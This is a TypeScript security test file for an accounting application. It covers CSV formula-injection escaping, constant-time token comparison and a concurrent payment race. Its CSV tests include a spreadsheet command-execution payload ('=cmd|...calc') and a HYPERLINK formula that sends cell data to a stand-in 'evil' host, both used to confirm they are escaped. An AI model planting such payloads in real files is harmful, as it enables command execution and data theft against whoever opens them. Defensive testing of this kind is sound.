// Third pen-test pass: CSV formula injection, TOCTOU race in payment
// application, constant-time token comparison.

import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { PrismaClient } from "@prisma/client";
import { toCsv } from "@/lib/utils/csv";
import { constantTimeEquals } from "@/lib/auth/token";
import { applyArPayment } from "@/lib/accounting/sub-ledgers/ar";
import { postJournalEntry } from "@/lib/accounting/post-journal";
import { openArItem } from "@/lib/accounting/sub-ledgers/ar";

const prisma = new PrismaClient();

// ─── CSV formula injection (CWE-1236) ────────────────────────────────────

describe("CSV writer — formula injection (CWE-1236)", () => {
  it("escapes a cell starting with =", () => {
    const csv = toCsv([["safe", "=cmd|'/c calc'!A1"]]);
    expect(csv).toBe("safe,'=cmd|'/c calc'!A1");
  });

  it("escapes a cell starting with +", () => {
    expect(toCsv([["+1+1"]])).toBe("'+1+1");
  });

  it("escapes a cell starting with -", () => {
    // A leading dash could be a number OR a formula. We escape both
    // — the user-controlled string case is what matters, and a real
    // negative number flows in as a JS number which String()s but
    // we keep the escape on strings to be safe.
    expect(toCsv([["-1+1"]])).toBe("'-1+1");
  });

  it("escapes a cell starting with @", () => {
    expect(toCsv([["@SUM(1+1)"]])).toBe("'@SUM(1+1)");
  });

  it("escapes a cell starting with a tab", () => {
    // Tab doesn't trigger RFC-4180 quote-wrapping (only , " \n do), but
    // the leading apostrophe IS still prepended — that's what defeats
    // the formula evaluator.
    expect(toCsv([["\t=2+2"]])).toBe(`'\t=2+2`);
  });

  it("escape + quote together: formula leader inside a comma-containing cell", () => {
    // "=HYPERLINK(...,\"click\")" → wraps in quotes (has comma + quote)
    // AND prefixes with apostrophe to neutralize the formula.
    const csv = toCsv([['=HYPERLINK("http://evil/?x="&A1,"click")']]);
    expect(csv.startsWith(`"'=`)).toBe(true);
    expect(csv).toContain(`""click""`); // doubled quotes are RFC-4180 right
  });

  it("does NOT escape a number that stringifies with a leading -", () => {
    // Numbers are trusted (caller controls them, they're not user-string).
    expect(toCsv([[-42]])).toBe("-42");
  });

  it("does NOT escape a benign string", () => {
    expect(toCsv([["Cash — Operating"]])).toBe("Cash — Operating");
  });

  it("ALL CSV exports (reports, JE, audit-log) pass through this writer", () => {
    // Documentation test: smoke check that any cell beginning with a
    // danger leader, regardless of WHERE in the row it appears, gets
    // escaped. Covers any future export route that might add cells
    // sourced from user input.
    const malicious = "=cmd|'/c calc'!A1";
    const r = toCsv([
      ["Account", "Memo", "Amount"],
      ["1000", malicious, "100.00"],
    ]);
    expect(r).toContain(`'${malicious}`);
    expect(r).not.toMatch(new RegExp(`,${malicious.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")},`));
  });
});

// ─── Constant-time token compare ─────────────────────────────────────────

describe("constantTimeEquals", () => {
  it("returns true for equal strings", () => {
    expect(constantTimeEquals("abc123", "abc123")).toBe(true);
  });

  it("returns false for unequal-length strings", () => {
    expect(constantTimeEquals("abc", "abc1")).toBe(false);
  });

  it("returns false for same-length but differing strings", () => {
    expect(constantTimeEquals("abc123", "abc124")).toBe(false);
  });

  it("returns false on empty vs non-empty", () => {
    expect(constantTimeEquals("", "x")).toBe(false);
    expect(constantTimeEquals("x", "")).toBe(false);
  });

  it("returns true on two empty strings", () => {
    expect(constantTimeEquals("", "")).toBe(true);
  });
});

// ─── TOCTOU race: concurrent payment application ─────────────────────────

describe("applyArPayment — TOCTOU race", () => {
  const SUFFIX = ("RACE" + Date.now().toString(36)).toUpperCase();
  const ENTITY_CODE = `RACE-${SUFFIX}`;
  let tenantId: string;
  let entityId: string;
  let openItemId: string;

  beforeAll(async () => {
    // Reuse the default tenant — we just need ONE entity with an AR
    // open item to race against.
    const defaultTenant = await prisma.tenant.findFirstOrThrow({
      where: { slug: "default" },
    });
    tenantId = defaultTenant.id;

    await prisma.currency.upsert({
      where: { code: "USD" },
      create: { code: "USD", name: "US Dollar", decimals: 2, symbol: "$" },
      update: {},
    });
    await prisma.book.upsert({
      where: { code: "US_GAAP" },
      create: { code: "US_GAAP", name: "US GAAP", basis: "US_GAAP", reportingCurrencyId: "USD" },
      update: {},
    });

    const entity = await prisma.legalEntity.create({
      data: { tenantId, code: ENTITY_CODE, name: "Race Co.", functionalCurrencyId: "USD" },
    });
    entityId = entity.id;

    const cal = await prisma.fiscalCalendar.create({
      data: {
        tenantId,
        entityId,
        code: `RACE-CAL-${SUFFIX}`,
        name: "Race cal",
        periodFrequency: "MONTHLY",
      },
    });
    await prisma.period.create({
      data: {
        tenantId,
        calendarId: cal.id,
        code: "2026-05",
        ordinal: 5,
        startsOn: new Date("2026-05-01"),
        endsOn: new Date("2026-05-31"),
      },
    });

    await prisma.account.createMany({
      data: [
        { tenantId, entityId, code: "1200", name: "AR", type: "ASSET", normalBalance: "DEBIT", isControlAccount: true, subtype: "AR_TRADE" },
        { tenantId, entityId, code: "4000", name: "Revenue", type: "REVENUE", normalBalance: "CREDIT" },
      ],
    });
    await prisma.party.create({
      data: { tenantId, entityId, code: "PARTY", displayName: "Party" },
    });

    // Bill $100 → AR open item with balance 100.
    const je = await postJournalEntry(prisma, {
      tenantId,
      entityCode: ENTITY_CODE,
      bookCode: "US_GAAP",
      documentDate: new Date("2026-05-10"),
      memo: "Bill",
      source: "MANUAL",
      lines: [
        { accountCode: "1200", debit: "100", partyCode: "PARTY" },
        { accountCode: "4000", credit: "100" },
      ],
    });
    openItemId = (
      await openArItem(prisma, {
        tenantId,
        entityCode: ENTITY_CODE,
        bookCode: "US_GAAP",
        partyCode: "PARTY",
        openedByEntryId: je.id,
        openedDate: new Date("2026-05-10"),
        amount: "100",
        currencyCode: "USD",
        controlAccountCode: "1200",
      })
    ).id;
  });

  afterAll(async () => {
    await prisma.arApplication.deleteMany({ where: { openItem: { entityId } } });
    await prisma.arOpenItem.deleteMany({ where: { entityId } });
    await prisma.party.deleteMany({ where: { entityId } });
    await prisma.journalLine.deleteMany({ where: { entry: { entityId } } });
    await prisma.journalEntry.deleteMany({ where: { entityId } });
    await prisma.account.deleteMany({ where: { entityId } });
    await prisma.period.deleteMany({ where: { calendar: { entityId } } });
    await prisma.fiscalCalendar.deleteMany({ where: { entityId } });
    await prisma.recordEvent.deleteMany({ where: { tenantId } });
    await prisma.legalEntity.deleteMany({ where: { id: entityId } });
    await prisma.$disconnect();
  });

  it("two concurrent full-balance payments → one succeeds, one fails (no over-application)", async () => {
    // Both callers try to apply $100 to a $100 AR item simultaneously.
    // Without the optimistic-concurrency guard, both would succeed →
    // balance underflows. With it, the second hit gets
    // "Concurrent update".
    const je = await postJournalEntry(prisma, {
      tenantId,
      entityCode: ENTITY_CODE,
      bookCode: "US_GAAP",
      documentDate: new Date("2026-05-20"),
      memo: "Race payment 1",
      source: "MANUAL",
      lines: [
        { accountCode: "1200", credit: "100", partyCode: "PARTY" },
        { accountCode: "4000", debit: "100" },
      ],
    });
    const je2 = await postJournalEntry(prisma, {
      tenantId,
      entityCode: ENTITY_CODE,
      bookCode: "US_GAAP",
      documentDate: new Date("2026-05-20"),
      memo: "Race payment 2",
      source: "MANUAL",
      lines: [
        { accountCode: "1200", credit: "100", partyCode: "PARTY" },
        { accountCode: "4000", debit: "100" },
      ],
    });

    // Race them: Promise.allSettled — at least one must reject.
    const results = await Promise.allSettled([
      applyArPayment(prisma, {
        openItemId,
        appliedByEntryId: je.id,
        appliedAmount: "100",
        appliedDate: new Date("2026-05-20"),
      }),
      applyArPayment(prisma, {
        openItemId,
        appliedByEntryId: je2.id,
        appliedAmount: "100",
        appliedDate: new Date("2026-05-20"),
      }),
    ]);

    const fulfilled = results.filter((r) => r.status === "fulfilled");
    const rejected = results.filter((r) => r.status === "rejected");
    expect(fulfilled.length).toBe(1);
    expect(rejected.length).toBe(1);
    // Rejection message should mention the concurrency cause (the
    // surrounding stack of optimistic-concurrency / "exceeds open
    // balance" / "Cannot apply payment to AR item in APPLIED state"
    // depending on scheduling — any of those means the race was
    // caught).
    const reason = (rejected[0] as PromiseRejectedResult).reason;
    const message = reason instanceof Error ? reason.message : String(reason);
    expect(message).toMatch(/concurrent|exceeds open|APPLIED state/i);

    // Final state: balance is 0 (one application succeeded), status APPLIED.
    const finalItem = await prisma.arOpenItem.findUniqueOrThrow({
      where: { id: openItemId },
    });
    expect(finalItem.currentBalance.toString()).toBe("0");
    expect(finalItem.status).toBe("APPLIED");
  });
});
